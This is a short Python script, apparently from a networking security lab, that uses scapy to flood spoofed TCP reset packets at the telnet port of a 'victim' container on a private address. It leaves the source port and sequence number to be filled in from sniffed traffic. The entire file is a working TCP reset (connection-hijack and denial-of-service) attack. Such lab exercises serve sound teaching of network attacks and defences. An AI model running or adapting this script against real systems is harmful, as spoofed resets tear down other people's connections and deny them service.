#!/bin/python3
from scapy.all import *
from random import randrange
import sys

# Fill with values found during analysis
intSourcePort = 0
intNextSequenceNumber = 0

# Targeting victim/server container's telnet port
strSourceIP = "10.9.0.1"
strDestinationIP = "10.9.0.5"
intDestinationPort =  23

while True:  # Run until CTRL+C

    # Build the IP layer of the packet
    lyrIP = IP(src=strSourceIP, dst=strDestinationIP)

    # Build TCP layer of the packet
    lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="R", seq=intNextSequenceNumber)
    
    # Build the full packet and show it
    pktSynPacket = lyrIP / lyrTCP
    pktSynPacket.show()

    # Send the packet
    send(pktSynPacket, verbose=0)
